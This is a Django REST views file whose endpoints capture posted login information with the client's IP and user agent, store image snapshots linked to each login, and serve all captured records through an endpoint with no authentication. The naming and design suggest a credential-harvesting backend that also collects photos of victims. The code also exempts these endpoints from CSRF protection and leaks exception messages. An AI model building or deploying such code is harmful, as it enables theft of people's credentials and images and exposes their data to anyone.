from django.shortcuts import render

# Create your views here.
# views.py
from rest_framework import status
from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import AllowAny
from rest_framework.response import Response
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from .models import UserLogin, UserSnapshot
from .Serializers import UserLoginSerializer, UserSnapshotSerializer
import json

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

@api_view(['POST'])
@permission_classes([AllowAny])
@csrf_exempt
def login_capture(request):
    try:
        data = request.data.copy()
        
        # Add IP and User Agent
        data['ip_address'] = get_client_ip(request)
        data['user_agent'] = request.META.get('HTTP_USER_AGENT', '')
        
        serializer = UserLoginSerializer(data=data)
        if serializer.is_valid():
            user_login = serializer.save()
            return Response({
                'status': 'success',
                'message': 'Login information captured',
                'user_id': user_login.id
            }, status=status.HTTP_201_CREATED)
        else:
            return Response({
                'status': 'error',
                'errors': serializer.errors
            }, status=status.HTTP_400_BAD_REQUEST)
            
    except Exception as e:
        return Response({
            'status': 'error',
            'message': str(e)
        }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['POST'])
@permission_classes([AllowAny])
@csrf_exempt
def snapshot_capture(request):
    try:
        user_login_id = request.data.get('user_login_id')
        image_data = request.data.get('image_data')
        
        if not user_login_id:
            return Response({
                'status': 'error',
                'message': 'user_login_id is required'
            }, status=status.HTTP_400_BAD_REQUEST)
        
        try:
            user_login = UserLogin.objects.get(id=user_login_id)
        except UserLogin.DoesNotExist:
            return Response({
                'status': 'error',
                'message': 'User login not found'
            }, status=status.HTTP_404_NOT_FOUND)
        
        data = {
            'user_login': user_login.id,
            'image_data': image_data
        }
        
        serializer = UserSnapshotSerializer(data=data)
        if serializer.is_valid():
            snapshot = serializer.save()
            return Response({
                'status': 'success',
                'message': 'Snapshot captured',
                'snapshot_id': snapshot.id
            }, status=status.HTTP_201_CREATED)
        else:
            return Response({
                'status': 'error',
                'errors': serializer.errors
            }, status=status.HTTP_400_BAD_REQUEST)
            
    except Exception as e:
        return Response({
            'status': 'error',
            'message': str(e)
        }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

@api_view(['GET'])
@permission_classes([AllowAny])
def get_user_data(request, user_id=None):
    try:
        if user_id:
            user_logins = UserLogin.objects.filter(id=user_id)
        else:
            user_logins = UserLogin.objects.all().order_by('-timestamp')
        
        data = []
        for login in user_logins:
            login_data = UserLoginSerializer(login).data
            snapshots = UserSnapshotSerializer(login.snapshots.all(), many=True).data
            login_data['snapshots'] = snapshots
            data.append(login_data)
        
        return Response({
            'status': 'success',
            'data': data
        })
        
    except Exception as e:
        return Response({
            'status': 'error',
            'message': str(e)
        }, status=status.HTTP_500_INTERNAL_SERVER_ERROR)